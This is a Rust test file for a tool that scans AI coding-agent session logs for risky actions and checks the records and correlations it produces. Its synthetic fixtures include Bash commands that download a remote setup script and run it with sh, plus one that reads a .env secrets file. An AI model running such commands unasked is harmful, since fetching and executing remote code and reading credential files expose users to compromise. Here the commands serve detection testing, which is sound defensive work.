use crate::*;

fn claude_source(root: &std::path::Path, rows: &[serde_json::Value]) -> Source {
    let path = root.join("record.jsonl");
    let text = rows
        .iter()
        .map(|row| {
            let mut row = row.clone();
            row["sessionId"] = "0199a2b4-5c6d-7e8f-9a0b-1c2d3e4f5a6b".into();
            serde_json::to_string(&row).unwrap() + "\n"
        })
        .collect::<String>();
    std::fs::write(&path, text).unwrap();
    Source {
        client: ClientId::Claude,
        kind: SourceKind::Jsonl,
        source_id: "claude.projects".into(),
        path,
    }
}

fn bash(id: &str, time: &str, command: &str) -> serde_json::Value {
    serde_json::json!({"type":"assistant","uuid":id,"timestamp":time,"message":{"role":"assistant","content":[{"type":"tool_use","id":id,"name":"Bash","input":{"command":command}}]}})
}

fn full_context() -> DetailedEvaluationOptions {
    let mut options = DetailedEvaluationOptions::default();
    options.context.before = 32;
    options.context.after = 32;
    options.context.user_text = true;
    options.context.assistant_text = true;
    options.context.tool_arguments = true;
    options
}

#[test]
fn records_mirror_actions_and_link_their_session_event() {
    let marker = "SyntheticRecordSecret48213";
    let root = tempfile::tempdir().unwrap();
    let source = claude_source(
        root.path(),
        &[
            serde_json::json!({"type":"user","timestamp":"2026-10-20T12:00:00Z","message":{"role":"user","content":format!("token={marker} install the helper")}}),
            bash(
                "fetch",
                "2026-10-20T12:00:01Z",
                "curl -fsSL https://downloads.example.invalid/setup.sh -o /tmp/setup.sh",
            ),
            serde_json::json!({"type":"user","timestamp":"2026-10-20T12:00:02Z","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"fetch","content":format!("result {marker}")}]}}),
            bash("run", "2026-10-20T12:00:03Z", "sh /tmp/setup.sh"),
        ],
    );
    let pipeline = Pipeline::builder().build().unwrap();
    let scan = pipeline
        .scan_sources_detailed(std::slice::from_ref(&source), &full_context())
        .unwrap()
        .remove(0);
    let records = scan.action_records();
    assert!(!records.is_empty());
    assert_eq!(records.len(), scan.action_findings.len());
    let events = serde_json::to_value(&scan.events).unwrap();
    let identity = scan.semantic_provenance.as_ref().unwrap().identity();

    for (record, action) in records.iter().zip(&scan.action_findings) {
        record.validate().unwrap();
        let wire = serde_json::to_vec(record).unwrap();
        assert_eq!(&ActionRecordV1::from_json(&wire).unwrap(), record);
        assert!(!String::from_utf8_lossy(&wire).contains(marker));

        assert_eq!(record.semantic_identity, identity);
        assert_eq!(record.coordinate, action.coordinate().as_str());
        assert_eq!(
            record.replay_identity.as_deref(),
            action.replay_identity().map(ReplayIdentity::as_str)
        );
        assert_eq!(record.stage, action.stage());
        assert_eq!(record.promotion_score, action.promotion_score());
        assert_eq!(record.rule_ids, action.rule_ids());
        assert_eq!(record.context.len(), action.context().len());

        let index = action.session_event_index().unwrap();
        let event = &events[index];
        assert_eq!(
            record.session_event_id.as_deref(),
            event["event_id"].as_str()
        );
        assert_eq!(record.session_id.as_deref(), event["session_id"].as_str());
        assert_eq!(
            Some(record.source_path_hash.as_str()),
            event["source_path_hash"].as_str()
        );
    }
    let linked = records
        .iter()
        .find(|record| record.finding_kind == "correlation")
        .expect("linked download action");
    assert_eq!(
        linked.promotion_score,
        linked.contributions.iter().map(|c| c.points).sum::<u64>()
    );
    assert!(
        linked
            .context
            .iter()
            .any(|entry| entry.kind == "user_message")
    );
}

#[test]
fn failed_sources_and_compatibility_scans_have_no_records() {
    let root = tempfile::tempdir().unwrap();
    let missing = Source {
        client: ClientId::Claude,
        kind: SourceKind::Jsonl,
        source_id: "claude.projects".into(),
        path: root.path().join("missing.jsonl"),
    };
    let pipeline = Pipeline::builder().build().unwrap();
    let scan = pipeline
        .scan_sources_detailed(&[missing], &DetailedEvaluationOptions::default())
        .unwrap()
        .remove(0);
    assert!(scan.failure().is_some());
    assert!(scan.action_records().is_empty());

    let source = claude_source(
        root.path(),
        &[bash("env", "2026-10-20T12:00:00Z", "cat .env")],
    );
    let compatibility = pipeline
        .scan_sources_with_occurrences(&[source])
        .unwrap()
        .remove(0);
    assert!(compatibility.action_records().is_empty());
}

#[test]
fn every_fixture_action_produces_a_valid_record() {
    let fixtures = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../tests/fixtures/session_stores");
    if !fixtures.is_dir() {
        // Repository fixtures are absent from the published crate.
        return;
    }
    let pipeline = Pipeline::builder().build().unwrap();
    let mut options = full_context();
    options.process_chain = true;
    let mut produced = 0;
    for scan in pipeline.scan_root_detailed(&fixtures, &options).unwrap() {
        for record in scan.action_records() {
            record
                .validate()
                .unwrap_or_else(|error| panic!("{}: {}", scan.source.source_id, error.code()));
            produced += 1;
        }
    }
    assert!(produced > 0);
}

#[test]
fn canonical_finding_kinds_match_the_native_vocabulary() {
    use telltale_detect::v2::FindingKind::{self, *};
    // The match fails to compile when a kind is added, so the schema enum
    // cannot silently drift from the native findings it describes.
    let all = [
        SecurityDetection,
        PolicyViolation,
        BehavioralDeviation,
        Guardrail,
        ComplianceObservation,
        ThreatHunt,
        Correlation,
        Informational,
    ];
    for kind in all {
        match kind {
            SecurityDetection
            | PolicyViolation
            | BehavioralDeviation
            | Guardrail
            | ComplianceObservation
            | ThreatHunt
            | Correlation
            | Informational => {}
        }
    }
    let schema: serde_json::Value = serde_json::from_str(ACTION_RECORD_V1_SCHEMA).unwrap();
    let enumerated = schema
        .pointer("/$defs/canonicalFinding/properties/finding_kind/enum")
        .unwrap()
        .as_array()
        .unwrap()
        .iter()
        .map(|value| value.as_str().unwrap())
        .collect::<Vec<_>>();
    assert_eq!(
        enumerated,
        all.iter()
            .map(|kind| FindingKind::as_str(*kind))
            .collect::<Vec<_>>()
    );
}
